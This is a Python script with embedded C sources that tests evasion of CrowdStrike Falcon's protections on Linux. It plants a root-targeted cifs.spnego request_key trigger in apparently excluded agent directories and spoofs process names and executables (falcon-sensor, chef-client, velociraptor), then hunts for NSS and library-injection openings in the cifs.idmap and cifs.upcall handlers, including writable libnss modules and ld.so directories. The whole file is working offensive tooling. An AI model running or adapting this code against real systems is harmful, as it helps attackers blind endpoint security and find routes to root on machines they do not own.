#!/usr/bin/env python3
"""Test CrowdStrike SVE bypass via excluded paths + process name spoofing.
Also checks if cifs.idmap handler uses NSS (potential injection vector)."""
import os, subprocess, sys

def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()
    except: return "(timeout)"

def p(msg): print(msg, flush=True)

# Trigger binary that does request_key + reports result
TRIG_SRC = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
int main(int ac, char **av){
    char d[512];
    snprintf(d,sizeof(d),
        "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
        getpid());
    /* Optional: set comm name */
    if(ac>1 && strlen(av[1])>0)
        prctl(PR_SET_NAME, av[1], 0, 0, 0);
    errno=0;
    long r=syscall(249,"cifs.spnego",d,"",(-3));
    printf("PID=%d EXE=%s COMM=%s request_key(cifs.spnego)=%ld errno=%d(%s)\n",
        getpid(), av[0], ac>1?av[1]:"(default)", r, errno, strerror(errno));
    return r<0?1:0;
}
'''

# Probe for cifs.idmap NSS usage
IDMAP_PROBE_SRC = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>
int main(){
    /* Create cifs.idmap key - CS allows this */
    char d[256];
    snprintf(d,sizeof(d),"uid:%d",getuid());
    errno=0;
    long r=syscall(249,"cifs.idmap",d,"",(-3));
    printf("request_key(cifs.idmap,%s)=%ld e=%d %s\n",d,r,errno,strerror(errno));
    /* Also try SID format */
    errno=0;
    r=syscall(249,"cifs.idmap","oi:S-1-5-21-0-0-0-1000","",(-3));
    printf("request_key(cifs.idmap,oi:S-1-5-21...)=%ld e=%d %s\n",r,errno,strerror(errno));
    return 0;
}
'''

def main():
    WD = "/tmp/sve_%d" % os.getpid()
    os.makedirs(WD, exist_ok=True)

    # Build trigger binary
    src = WD + "/trig.c"
    with open(src, "w") as f: f.write(TRIG_SRC)
    trig = WD + "/trig"
    r = os.system("gcc -o %s %s 2>&1" % (trig, src))
    if r != 0:
        p("[!] trig build failed"); sys.exit(1)

    # Build idmap probe
    src2 = WD + "/idmap.c"
    with open(src2, "w") as f: f.write(IDMAP_PROBE_SRC)
    idmap = WD + "/idmap_probe"
    os.system("gcc -o %s %s 2>&1" % (idmap, src2))

    p("=== SVE BYPASS TEST ===\n")

    # 1. Baseline from /tmp
    p("--- 1. BASELINE (from /tmp) ---")
    p(sh(trig))

    # 2. Test excluded paths
    p("\n--- 2. SVE PATH EXCLUSION TEST ---")
    paths = [
        "/opt/szef-client/",
        "/opt/tivoli/cit/bin/",
        "/opt/tivoli/cit/",
        "/usr/local/bin/",
    ]
    for d in paths:
        dst = d + "trig_test"
        r = sh("cp %s '%s' 2>&1 && chmod +x '%s' 2>&1" % (trig, dst, dst))
        if "denied" in r.lower() or "error" in r.lower() or "cannot" in r.lower():
            p("  %s: COPY FAILED (%s)" % (d, r))
        else:
            p("  %s:" % d)
            p("  " + sh("'%s' 2>&1" % dst))
            sh("rm -f '%s' 2>/dev/null" % dst)

    # 3. Process name spoofing
    p("\n--- 3. PROCESS NAME SPOOFING ---")
    names = ["velociraptor_c", "chef-client", "inspec", "falcon-sensor"]
    for n in names:
        p("  comm=%s: %s" % (n, sh("%s '%s' 2>&1" % (trig, n))))

    # 4. Symlink spoofing (/proc/self/exe)
    p("\n--- 4. SYMLINK/EXE SPOOFING ---")
    for name, target in [
        ("velociraptor_client", "/usr/local/bin/velociraptor_client"),
        ("chef-client", "/opt/szef-client/bin/chef-client"),
        ("inspec", "/opt/szef-client/bin/inspec"),
        ("cit_agent", "/opt/tivoli/cit/bin/cit_agent"),
    ]:
        lnk = "/tmp/" + name
        sh("rm -f '%s'" % lnk)
        # Hardlink (same inode = same /proc/self/exe)
        r = sh("ln '%s' '%s' 2>&1" % (trig, lnk))
        if "denied" in r.lower() or "error" in r.lower():
            # Fallback to copy
            sh("cp '%s' '%s' && chmod +x '%s'" % (trig, lnk, lnk))
        p("  %s: %s" % (name, sh("'%s' 2>&1" % lnk)))
        sh("rm -f '%s'" % lnk)

    # 5. Combined: run from excluded path WITH spoofed comm
    p("\n--- 5. COMBINED: EXCLUDED PATH + SPOOFED COMM ---")
    for d in paths:
        dst = d + "velociraptor_client"
        r = sh("cp %s '%s' 2>&1 && chmod +x '%s' 2>&1" % (trig, dst, dst))
        if "denied" not in r.lower() and "error" not in r.lower() and "cannot" not in r.lower():
            p("  %s (comm=falcon-sensor):" % dst)
            p("  " + sh("'%s' falcon-sensor 2>&1" % dst))
            sh("rm -f '%s' 2>/dev/null" % dst)

    # 6. Check cifs.idmap handler behavior
    p("\n--- 6. CIFS.IDMAP HANDLER ANALYSIS ---")
    for b in ["/usr/sbin/cifs.idmap", "/sbin/cifs.idmap"]:
        if os.path.exists(b):
            p("  %s:" % b)
            p("    NSS funcs: %s" % sh("strings '%s' | grep -iE 'getpwuid|getpwnam|getgrnam|nss|dlopen|getaddrinfo' | head -10" % b))
            p("    Libs: %s" % sh("ldd '%s' 2>/dev/null | head -10" % b))
            p("    RPATH: %s" % sh("readelf -d '%s' 2>/dev/null | grep -iE 'rpath|runpath'" % b))
            p("    Caps/SUID: mode=%s %s" % (
                oct(os.stat(b).st_mode)[-4:],
                sh("getcap '%s' 2>/dev/null" % b).strip()))

    # 7. Run idmap probe
    p("\n--- 7. CIFS.IDMAP KEY CREATION (strace) ---")
    p(sh("timeout 10 strace -f -e trace=execve,openat,connect -o /tmp/st_idmap2.txt %s 2>&1" % idmap, t=15))
    p("  Handler trace:")
    p(sh("grep -E 'execve|dlopen|nss|nsswitch' /tmp/st_idmap2.txt 2>/dev/null | head -20"))

    # 8. Check cifs.upcall directly
    p("\n--- 8. CIFS.UPCALL DIRECT EXEC TEST ---")
    for b in ["/usr/sbin/cifs.upcall", "/sbin/cifs.upcall"]:
        if os.path.exists(b):
            p("  Perms: %s" % sh("ls -la '%s'" % b))
            p("  Caps: %s" % sh("getcap '%s' 2>/dev/null" % b))
            # Try running it directly (will fail without proper key, but shows error)
            p("  Direct exec: %s" % sh("timeout 3 '%s' -v 2>&1 || timeout 3 '%s' --help 2>&1" % (b, b)))
            # Check what NSS it uses
            p("  NSS funcs: %s" % sh("strings '%s' | grep -iE 'getpwuid|getpwnam|nss|nsswitch|dlopen' | head -10" % b))
            p("  Libs: %s" % sh("ldd '%s' 2>/dev/null | head -10" % b))

    # 9. Check nsswitch.conf (for NSS module order)
    p("\n--- 9. NSS CONFIG ---")
    p(sh("cat /etc/nsswitch.conf 2>/dev/null"))

    # 10. Check if any NSS module paths are writable
    p("\n--- 10. NSS MODULE PATHS ---")
    p(sh("ls -la /lib64/libnss_* /usr/lib64/libnss_* 2>/dev/null"))
    p(sh("find /lib64 /usr/lib64 -name 'libnss_*' -writable 2>/dev/null"))

    # 11. Check LD_LIBRARY_PATH, LD_PRELOAD env for handlers
    p("\n--- 11. HANDLER ENVIRONMENT ---")
    p("  /etc/environment: %s" % sh("cat /etc/environment 2>/dev/null"))
    p("  /etc/ld.so.conf: %s" % sh("cat /etc/ld.so.conf 2>/dev/null"))
    p("  /etc/ld.so.conf.d/: %s" % sh("cat /etc/ld.so.conf.d/*.conf 2>/dev/null"))
    p("  Writable ld.so dirs: %s" % sh("for d in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null | grep ^/); do test -w \"$d\" && echo \"WRITABLE: $d\"; done"))

    p("\n=== DONE ===")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
